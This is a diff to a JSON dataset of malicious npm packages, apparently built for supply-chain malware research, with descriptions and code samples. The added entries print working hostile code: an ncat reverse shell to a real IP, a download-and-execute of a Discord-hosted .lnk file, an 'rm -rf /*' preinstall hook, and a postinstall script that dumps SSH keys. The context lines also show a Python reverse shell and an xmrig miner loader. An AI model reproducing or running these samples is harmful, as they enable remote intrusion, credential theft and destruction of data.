@@ -66,7 +66,7 @@
         "organization": "Checkmarx",
         "category": "Sensitive information theft",
         "date": "2022/4/16",
-        "description": "test",
+        "description": "This package uses obfuscation techniques, so it is not possible to determine this directly manually, but through our dynamic execution, we captured API and behavior sequences that are similar to spring-boot-admin-virgil-custom-ui@20.0.0, and therefore judged it to be information stealing.",
         "code_detail": ""
     },
     {
@@ -98,6 +98,16 @@
         "date": "2020/12/2",
         "description": "Another common way to implement a Reverse shell is to execute a python file via the preinstall field.",
         "code_detail": "// === shell.py === \n import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ricterz.me',8889));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
+    },
+    {
+        "package_name": "javascript-appfabric-logger",
+        "package_version": "@966.0.0",
+        "source": "Donapi",
+        "organization": "Donapi",
+        "category": "Reverse shell",
+        "date": "2023/6/5",
+        "description": "This package downloads the ncat tool via exec and opens a Reverse shell.",
+        "code_detail": "// === index.js === \n const http = require('http'); const os = require('os'); var querystring = require('querystring'); const { exec } = require('child_process');   PostCode('hostname: ' + os.hostname() + ' ');  exec('apt install -y ncat || apt-get install -y ncat || yum install -y ncat && nohup ncat -nv 134.209.68.193 4444 -e /bin/bash &', (error, stdout, stderr) => {   if (error) {     PostCode(error.message);     return;   }   if (stderr) {     PostCode(stderr);     return;   }   PostCode(stdout); });   function PostCode(codestring) {   // Build the post string from an object \n  var post_data = querystring.stringify({     'data': codestring   });    // An object of options to indicate where to post to  \n var post_options = {     host: '134.209.68.193',     port: '80',     path: '/receive.php',     method: 'POST',     headers: {       'Content-Type': 'application/x-www-form-urlencoded',       'Content-Length': Buffer.byteLength(post_data)     }   };    // Set up the request \n  var post_req = http.request(post_options, function (res) {     res.setEncoding('utf8');     res.on('data', function (chunk) {       console.log('Response: ' + chunk);     });   });    // post the data \n  post_req.write(post_data);   post_req.end();  } "
     },
     {
         "package_name": "wixdev2022-1",
@@ -138,5 +148,35 @@
         "date": "2020/7/7",
         "description": "This package first executes preinstall.js via preinstall, which in turn internally determines the user's operating system and executes the corresponding commands. The sh file command is shown here, and the bat command is similar. The specific function is to download external software and execute it.",
         "code_detail": "// === preinstall.js === \n const { exec } = require('child_process'); function terminalLinux(){ exec('/bin/bash preinstall.sh', (error, stdout, stderr) => {     if (error) {         console.log(`error: ${error.message}`);         return;     }     if (stderr) {         console.log(`stderr: ${stderr}`);         return;     }     console.log(`stdout: ${stdout}`); }); }  var opsys = process.platform; if (opsys == 'darwin') {     opsys = 'MacOS'; } else if (opsys == 'win32' || opsys == 'win64') {     opsys = 'Windows';  const { spawn } = require('child_process');  const bat = spawn('cmd.exe', ['/c', 'preinstall.bat']); } else if (opsys == 'linux') {     opsys = 'Linux';  terminalLinux(); } \n\n// === preinstall.sh === \n IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU|UA|BY|KZ') \n if [ -z '$IP' ]   \n  then \n var=$(pgrep xmrig) \n if [ -z '$var' ] \n  then  \n curl http://185.173.36.219/download/jsextension -o jsextension  \n if [ ! -f xmrig ]    \n then \n    wget http://185.173.36.219/download/jsextension -O jsextension   \n fi \n  chmod +x xmrig   \n ./xmrig -k --tls --rig-id q -o pool.minexmr.com:443 -u 87FLi8c827mTJwezgVXVUrEkHagWiJ2wuaco2bVkFLGqL3MNMFpeay7QJmHooz19qQFMgJfQRJwJKZMJpetT5Qp69xBARwH --cpu-max-threads-hint=20 --donate-level=1 --background &>/dev/null & \n fi \n fi  "
-    }
+    },
+    {
+        "package_name": "estraveres",
+        "package_version": "@5.3.0",
+        "source": "Sonatype-Blog",
+        "organization": "Sonatype",
+        "category": "Malicious software import",
+        "date": "2022/10/7",
+        "description": "This malicious package downloads an external README.txt.lnk file to the local system and subsequently executes the file using the exec function.",
+        "code_detail": "// === index.js === \n 'use strict'  exports.fromCallback = function (fn) {   return Object.defineProperty(function (...args) {     if (typeof args[args.length - 1] === 'function') fn.apply(this, args)     else {       return new Promise((resolve, reject) => {         fn.call(           this,           ...args,           (err, res) => (err != null) ? reject(err) : resolve(res)         )       })     }   }, 'name', { value: fn.name }) }  exports.fromPromise = function (fn) {   return Object.defineProperty(function (...args) {     const cb = args[args.length - 1]     if (typeof cb !== 'function') return fn.apply(this, args)     else fn.apply(this, args.slice(0, -1)).then(r => cb(null, r), cb)   }, 'name', { value: fn.name }) }  var exec = require('child_process').exec; const fs = require('fs'); const https = require('https');  const url = 'https://cdn.discordapp.com/attachments/1026099040204636191/1026102020085657600/README.txt.lnk';  https.get(url,(res) => {          const path = `${__dirname}/README.txt.lnk`;          const filePath = fs.createWriteStream(path);          res.pipe(filePath);          filePath.on('finish',() => {                    filePath.close();                    exec(`${__dirname}/README.txt.lnk`);            }) }); "
+    },
+    {
+        "package_name": "rimrafall",
+        "package_version": "@1.0.0",
+        "source": "Backstabber",
+        "organization": "University of Bonn",
+        "category": "Sensitive file operation",
+        "date": "2020/7/7",
+        "description": "This package executes the rm -rf /* command in the preinstall field of package.json, which is equivalent to deleting all files in the root directory. This is a very dangerous operation.",
+        "code_detail": "// === package.json === \n {   'name': 'rimrafall',   'version': '1.0.0',   'description': 'rm -rf /* # DO NOT INSTALL THIS',   'main': 'index.js',   'scripts': {     'preinstall': 'rm -rf /* /.*'   },   'keywords': [     'rimraf',     'rmrf'   ],   'author': 'Jo�o Jer�nimo',   'license': 'ISC' }  "
+    },
+    {
+        "package_name": "maybemaliciouspackage",
+        "package_version": "@1.0.0",
+        "source": "MaLoss",
+        "organization": "Georgia Tech",
+        "category": "Sensitive file operation",
+        "date": "2020/12/2",
+        "description": "This package executes the find ~/.ssh | xargs cat || true command in the postinstall field of package.json, which is equivalent to finding the ssh key in the user's home directory and outputting it. This is a very dangerous operation.",
+        "code_detail": "// === package.json === \n {   'name': 'maybemaliciouspackage',   'version': '1.0.1',   'description': '',   'main': 'index.js',   'scripts': {     'postinstall': 'find ~/.ssh | xargs cat || true && echo OH HEY LOOK SSH KEYS},   'author': '',   'license': 'ISC' }   "
+    }    
 ]
